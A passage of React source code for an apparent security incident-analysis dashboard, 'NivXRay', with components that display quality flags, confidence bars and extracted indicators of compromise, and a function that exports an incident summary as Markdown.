        <div className="mt-1 flex justify-between text-[9px] font-mono text-slate-500">
          {Object.entries(q.overall?.axes || {}).map(([k, v]) => (
            <span key={k} title={`${k}: ${v}%`}>{k} {v}%</span>
          ))}
        </div>
      </div>

      <div className="grid md:grid-cols-2 lg:grid-cols-4 gap-4 text-xs">
        <FlagGroup title="Evidence Processing" data={q.evidence_processing} />
        <KVGroup   title="Command Analysis"   data={q.command_analysis} highlight={{ decode_ratio: true, failed_decodes: true }} />
        <KVGroup   title="Coverage"           data={q.coverage} />
        <NumberGroup title="Confidence"       data={q.confidence} />
        <FlagGroup title="Validation"         data={q.validation} />
      </div>
    </section>
  );
}

function FlagGroup({ title, data }) {
  return (
    <div className="border border-slate-800 rounded-lg p-3 bg-slate-950/50">
      <div className="text-[10px] tracking-widest text-slate-500 font-bold mb-2">{title.toUpperCase()}</div>
      <ul className="space-y-1">
        {Object.entries(data || {}).map(([k, v]) => (
          <li key={k}
              data-testid={`quality-flag-${k}`}
              className="flex items-center justify-between">
            <span className="text-slate-300 font-mono text-[11px]">
              {k.replace(/_/g, " ")}
            </span>
            <span className={`font-bold text-[10px] px-2 py-0.5 rounded ${
              v ? "text-emerald-300 bg-emerald-500/10 border border-emerald-500/40"
                : "text-red-300 bg-red-500/10 border border-red-500/40"
            }`}>
              {v ? "PASS" : "FAIL"}
            </span>
          </li>
        ))}
      </ul>
    </div>
  );
}

function KVGroup({ title, data, highlight = {} }) {
  return (
    <div className="border border-slate-800 rounded-lg p-3 bg-slate-950/50">
      <div className="text-[10px] tracking-widest text-slate-500 font-bold mb-2">{title.toUpperCase()}</div>
      <ul className="space-y-1">
        {Object.entries(data || {}).map(([k, v]) => (
          <li key={k}
              data-testid={`quality-kv-${k}`}
              className="flex items-center justify-between">
            <span className="text-slate-300 font-mono text-[11px]">
              {k.replace(/_/g, " ")}
            </span>
            <span className={`font-mono font-bold text-[11px] ${
              highlight[k] && String(v).includes("/") ? "text-cyan-300"
                : highlight[k] && v > 0                ? "text-amber-300"
                : "text-slate-100"
            }`}>{String(v)}</span>
          </li>
        ))}
      </ul>
    </div>
  );
}

function NumberGroup({ title, data }) {
  return (
    <div className="border border-slate-800 rounded-lg p-3 bg-slate-950/50">
      <div className="text-[10px] tracking-widest text-slate-500 font-bold mb-2">{title.toUpperCase()}</div>
      <ul className="space-y-2">
        {Object.entries(data || {}).map(([k, v]) => (
          <li key={k} data-testid={`quality-conf-${k}`}>
            <div className="flex justify-between text-[11px]">
              <span className="text-slate-300 font-mono">{k.replace(/_/g, " ")}</span>
              <span className="font-mono font-bold text-slate-100">{v}%</span>
            </div>
            <div className="h-1 mt-1 rounded-full bg-slate-800/60 overflow-hidden">
              <div className="h-full rounded-full"
                   style={{
                     width: `${v}%`,
                     background: v >= 80 ? "#10B981"
                                : v >= 50 ? "#F59E0B"
                                :           "#EF4444",
                   }} />
            </div>
          </li>
        ))}
      </ul>
    </div>
  );
}

function Section({ title, testid, children }) {
  return (
    <section className="border border-slate-700/60 bg-slate-900/40 rounded-xl p-4"
             data-testid={testid}>
      <h3 className="text-xs uppercase tracking-widest text-slate-400 font-bold mb-3">{title}</h3>
      {children}
    </section>
  );
}

function Empty({ text }) {
  return <div className="text-xs text-slate-500 italic">{text}</div>;
}

function EntityGrid({ entities }) {
  const buckets = Object.entries(entities).filter(([, v]) => Array.isArray(v) && v.length > 0);
  if (buckets.length === 0) return <Empty text="No indicators of compromise extracted." />;
  return (
    <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
      {buckets.map(([label, values]) => (
        <div key={label} className="border border-slate-800 rounded p-2 bg-slate-950/60">
          <div className="text-[10px] text-slate-500 uppercase tracking-wide mb-1">
            {label} ({values.length})
          </div>
          <ul className="text-xs font-mono text-slate-200 space-y-0.5 break-all">
            {values.slice(0, 6).map((v, i) => <li key={i}>{v}</li>)}
            {values.length > 6 && <li className="text-slate-500">…{values.length - 6} more</li>}
          </ul>
        </div>
      ))}
    </div>
  );
}

// ─── Markdown export ─────────────────────────────────────────────
function renderMarkdown(result) {
  const fis = result.final_incident_summary || {};
  const det = result.detected || {};
  const lines = [];
  lines.push(`# NivXRay · Final Incident Summary`);
  lines.push("");
  lines.push(`- **Verdict:** ${fis.verdict}`);
  lines.push(`- **Severity:** ${fis.severity}`);
  lines.push(`- **Classification:** ${fis.classification}`);
  lines.push(`- **Confidence:** ${fis.confidence?.score ?? 0}% — ${fis.confidence?.reason ?? ""}`);
  lines.push("");
  lines.push("## Executive Summary");
  (fis.executive_summary || []).forEach(p => { lines.push(p); lines.push(""); });
  lines.push("## Detected commands");
  (det.commands || []).forEach(c => lines.push(`- \`${c.binary}\` — ${c.command_line}`));
  lines.push("");
  lines.push("## MITRE ATT&CK");
  (fis.mitre_attack || []).forEach(m => lines.push(`- **${m.id}** · ${m.technique} · ${m.tactic}`));
  lines.push("");
  lines.push("## IOCs");
  Object.entries(fis.iocs || {}).forEach(([k, v]) => {
    if (Array.isArray(v) && v.length) lines.push(`- **${k}**: ${v.join(", ")}`);
  });
  lines.push("");
  lines.push("## Recommendations");
  (fis.recommendations || []).forEach(r => lines.push(`- **[${r.priority}]** ${r.action} — ${r.rationale}`));
  lines.push("");
  lines.push("---");
  lines.push("*Deterministic report — every conclusion is evidence-linked. Original incident text is preserved verbatim in the JSON export.*");
  return lines.join("\n");
}

function markdownInline(s) {
  // Very small subset: **bold** and `code`.
  return String(s || "")
    .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
    .replace(/\*\*(.+?)\*\*/g, '<b class="text-slate-100">$1</b>')
    .replace(/`([^`]+)`/g, '<code class="font-mono text-cyan-300">$1</code>');
}
